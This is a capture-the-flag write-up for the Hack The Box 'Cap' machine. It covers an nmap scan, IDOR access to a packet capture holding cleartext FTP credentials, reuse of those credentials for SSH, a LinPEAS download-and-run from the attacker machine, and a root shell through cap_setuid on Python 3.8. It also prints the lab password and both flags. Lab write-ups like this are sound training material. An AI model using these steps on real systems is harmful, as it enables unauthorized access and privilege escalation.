# Cap: Hack The Box Writeup

**Machine:** Cap  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** December 2025  

---

## Summary

Cap is an easy Linux machine running a web-based security dashboard that exposes network capture files. An IDOR vulnerability in the web application allows access to a packet capture containing FTP credentials in cleartext. Those credentials work for both FTP and SSH, granting initial access. Privilege escalation is achieved by abusing Linux capabilities: specifically `cap_setuid` set on Python 3.8, which allows spawning a root shell.

**Key techniques:** IDOR · PCAP analysis · Credential reuse · Linux capabilities abuse

---

## Reconnaissance

Started with a full port scan:

```bash
sudo nmap -sV -sC -p- -T5 10.129.9.171
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn: "Security Dashboard"
```

Three services: FTP, SSH, and a web application. The web app title "Security Dashboard" is immediately interesting: a security dashboard that might expose sensitive data is worth investigating first.

---

## Enumeration

### FTP: Anonymous Login Check

First thing to check on any exposed FTP service is anonymous login:

```bash
ftp 10.129.9.171 21
Name: anonymous
# 530 Login incorrect: anonymous login disabled
```

No luck. Moving to the web application.

### Web Application: IDOR Discovery

Navigating to `http://10.129.9.171` reveals a security dashboard with network monitoring features.

<img width="1600" height="832" alt="Screenshot 2026-03-05 123526" src="https://github.com/user-attachments/assets/024c1fb5-18e9-42e2-9c70-369db67926a8" />

One section allows downloading packet capture (`.pcap`) files: the URL structure looks like this:

```
http://10.129.9.171/data/1
```

<img width="1600" height="828" alt="Screenshot 2026-03-05 123549" src="https://github.com/user-attachments/assets/a4f2d98b-acca-4eb5-8859-bbdbe0054e79" />

The `/data/1` endpoint serves a `.pcap` file. The number at the end is a user-controlled ID: this is a classic **Insecure Direct Object Reference (IDOR)** situation. The application is not validating whether the requesting user owns that capture ID.

Changing `1` to `0`:

```
http://10.129.9.171/data/0
```

<img width="1597" height="824" alt="Screenshot 2026-03-05 123612" src="https://github.com/user-attachments/assets/6f30e871-e8ef-4215-8c17-b63760621e93" />

This returns a different capture file: `0.pcap`: which is significantly larger and contains much more traffic.

---

## Initial Access

### PCAP Analysis: Cleartext FTP Credentials

<img width="1596" height="866" alt="Screenshot 2026-03-05 123632" src="https://github.com/user-attachments/assets/7dbe57d7-9f32-445b-af94-d59f729e3f8c" />

Opening `0.pcap` in Wireshark and following the TCP stream reveals an FTP session with credentials transmitted in **cleartext**:

```
USER nathan
PASS Buck3tH4TF0RM3!
```
<img width="1597" height="870" alt="Screenshot 2026-03-05 123651" src="https://github.com/user-attachments/assets/b80f0aac-90fa-453d-ae50-d76f87b54a22" />

<img width="1588" height="869" alt="Screenshot 2026-03-05 123707" src="https://github.com/user-attachments/assets/cc14c8cb-9d98-4125-9d59-46aedd0cd5e9" />

FTP does not encrypt credentials by default: everything is sent in plaintext, which is exactly why it shows up clearly in a packet capture.

### FTP Login: User Flag

Testing the credentials against FTP:

```bash
ftp 10.129.9.171 21
Name: nathan
Password: Buck3tH4TF0RM3!
# 230 Login successful
```

```bash
ftp> ls -la
# user.txt visible in the directory
ftp> get user.txt
ftp> !cat user.txt
# 0edc02417ccd9db0090bf17af7d3667c
```

### SSH Login: Shell Access

Credentials tend to get reused. Testing the same password against SSH:

```bash
ssh nathan@10.129.9.171
# Password: Buck3tH4TF0RM3!
# Login successful
```

Credential reuse gives us a proper interactive shell as `nathan`.

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
# nathan cannot run sudo: no output returned
```

No sudo rights. Moving on to automated enumeration.

### LinPEAS: Automated Enumeration

Downloaded LinPEAS from the [PEASS-ng GitHub repository](https://github.com/peass-ng/PEASS-ng) to the local attack machine, then transferred it to the target using Python's built-in HTTP server:

**On attack machine:**
```bash
cd /path/to/linpeas
python3 -m http.server 8000
```

**On target:**
```bash
wget http://10.10.15.22:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Rabbit Hole: CVE-2021-3560

LinPEAS flagged the system as potentially vulnerable to CVE-2021-3560 (a Polkit privilege escalation). Attempted to exploit it:

```bash
./poc.sh
# ERROR: Accounts service and Gnome-Control-Center NOT found
# Aborting Execution
```

The exploit requires `accountsservice` and `gnome-control-center` to be installed: neither was present on this machine. Dead end.

### Linux Capabilities: cap_setuid on Python

LinPEAS also flagged something more interesting:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
<img width="1478" height="718" alt="Screenshot 2026-03-05 123935" src="https://github.com/user-attachments/assets/1f8b3dae-9467-4525-911c-94ebece4a525" />

**Linux capabilities** are a way of granting specific elevated privileges to binaries without giving them full root. `cap_setuid` allows a process to set its User ID arbitrarily: including to UID 0 (root).

Since Python 3.8 has `cap_setuid`, we can use it to change our UID to 0 and spawn a root shell:

```bash
python3
```

```python
>>> import os
>>> os.setuid(0)
>>> os.system('sh')
```

```bash
# whoami
root
# cat /root/root.txt
7bcb47acf02f9ffb7740b74cbb20ba62
```
---

<!-- Completion Image Here -->
<img width="1199" height="684" alt="Screenshot 2026-04-20 155050" src="https://github.com/user-attachments/assets/419c8b88-7d3c-480b-a0ca-2a9ef32b8387" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| IDOR | `/data/<id>` endpoint | Access to other users' packet captures |
| Cleartext credentials in PCAP | FTP traffic in `0.pcap` | Credential exposure |
| Credential reuse | FTP → SSH | Lateral access via same password |
| cap_setuid on Python 3.8 | `/usr/bin/python3.8` | Full privilege escalation to root |

---

## Key Takeaways

- **IDOR vulnerabilities** are easy to miss but trivial to exploit: always test sequential or predictable IDs in URLs
- **FTP is inherently insecure**: credentials and data are transmitted in cleartext; use SFTP or FTPS instead
- **Credential reuse** is extremely common: always test valid credentials across all available services
- **Linux capabilities** are a frequently overlooked attack surface; `cap_setuid` on an interpreter like Python is essentially equivalent to a SUID root binary
- **Not every lead pays off**: the CVE-2021-3560 rabbit hole is a good reminder to enumerate multiple escalation paths rather than fixating on one

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
